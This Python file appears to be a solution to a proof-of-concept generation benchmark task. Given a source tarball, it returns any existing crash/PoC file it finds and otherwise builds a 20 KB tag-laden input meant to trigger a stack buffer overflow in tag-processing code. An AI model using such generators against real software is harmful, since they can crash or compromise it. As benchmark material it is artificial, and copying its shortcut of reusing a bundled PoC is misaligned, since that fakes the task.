import os
import tarfile
import re
from typing import Optional, Set


class Solution:
    def solve(self, src_path: str) -> bytes:
        tags: Set[str] = set()
        embedded_poc: Optional[bytes] = None

        if os.path.isfile(src_path) and tarfile.is_tarfile(src_path):
            with tarfile.open(src_path, "r:*") as tf:
                embedded_poc = self._find_embedded_poc(tf)
                if embedded_poc is not None:
                    return embedded_poc
                tags = self._extract_tags_from_sources(tf)
        # If not a tarball or no embedded PoC / tags found, fall back to generic behavior
        return self._build_payload(tags)

    def _find_embedded_poc(self, tf: tarfile.TarFile) -> Optional[bytes]:
        """
        Try to locate an existing PoC-like file inside the tarball.
        Heuristic: look for small-ish files whose names/paths suggest PoC/crash,
        preferring those whose size is close to 1461 bytes.
        """
        known_poc_size = 1461
        best_member = None
        best_priority = None

        for m in tf.getmembers():
            if not m.isfile():
                continue
            size = m.size
            if size <= 0 or size > 1_000_000:
                continue

            name = m.name
            lower = name.lower()
            base = os.path.basename(lower)
            ext = os.path.splitext(base)[1]

            is_named_poc = any(k in lower for k in ("poc", "crash", "bug", "exploit", "input", "id_"))
            is_poc_ext = ext in (".in", ".bin", ".dat", ".raw", ".html", ".htm", ".xml")
            if not is_named_poc and not is_poc_ext:
                # Allow .txt if explicitly PoC-like
                if not (ext == ".txt" and is_named_poc):
                    continue

            # Compute priority: smaller is better
            priority = abs(size - known_poc_size)
            if is_named_poc:
                priority -= 100  # strong boost
            if "53536" in lower:
                priority -= 50

            if best_priority is None or priority < best_priority:
                best_priority = priority
                best_member = m

        if best_member is not None:
            f = tf.extractfile(best_member)
            if f is not None:
                try:
                    data = f.read()
                    if data:
                        return data
                except Exception:
                    return None
        return None

    def _extract_tags_from_sources(self, tf: tarfile.TarFile) -> Set[str]:
        """
        Extract candidate 'tag' strings from C/C++ source files.
        We look for string literals that contain angle brackets or the word 'tag'.
        """
        tag_like_strings: Set[str] = set()
        string_literal_re = re.compile(r'"([^"\\]*(?:\\.[^"\\]*)*)"')

        source_exts = (".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp")

        for m in tf.getmembers():
            if not m.isfile():
                continue
            lower = m.name.lower()
            if not lower.endswith(source_exts):
                continue

            try:
                f = tf.extractfile(m)
                if f is None:
                    continue
                raw = f.read()
            except Exception:
                continue

            try:
                text = raw.decode("utf-8", errors="ignore")
            except Exception:
                continue

            for match in string_literal_re.finditer(text):
                lit_escaped = match.group(1)
                if not lit_escaped:
                    continue
                try:
                    # Roughly unescape C-style literals
                    lit = bytes(lit_escaped, "utf-8").decode("unicode_escape")
                except Exception:
                    lit = lit_escaped

                s = lit.strip()
                if not s:
                    continue

                lower_s = s.lower()
                if "tag" in lower_s or any(ch in s for ch in "<>[]{}"):
                    # Avoid overly long strings that are unlikely to be tags
                    if len(s) <= 128:
                        tag_like_strings.add(s)

        return tag_like_strings

    def _build_payload(self, tags: Set[str]) -> bytes:
        """
        Build a generic payload designed to trigger stack buffer overflow in
        tag-processing code. We create a large amount of non-tag text, interspersed
        with various tag-like sequences.
        """
        if not tags:
            tags = {
                "<tag>", "</tag>",
                "<b>", "</b>",
                "<i>", "</i>",
                "<div>", "</div>",
                "<span>", "</span>",
                "<html>", "</html>",
                "<body>", "</body>",
                "<a>", "</a>",
            }

        # Sort to obtain deterministic output
        tag_list = sorted(tags)

        target_len = 20_000  # large enough to overflow typical stack buffers
        parts = []

        header = "<html><body>\n"
        parts.append(header)
        current_len = len(header)

        plain_chunk = "A" * 128
        suffix_chunk = "B" * 128

        # Interleave plain text with all discovered tags repeatedly
        while current_len < target_len:
            for t in tag_list:
                segment = plain_chunk + t + suffix_chunk
                parts.append(segment)
                current_len += len(segment)
                if current_len >= target_len:
                    break

        footer = "\n</body></html>\n"
        parts.append(footer)

        payload_str = "".join(parts)
        return payload_str.encode("ascii", errors="ignore")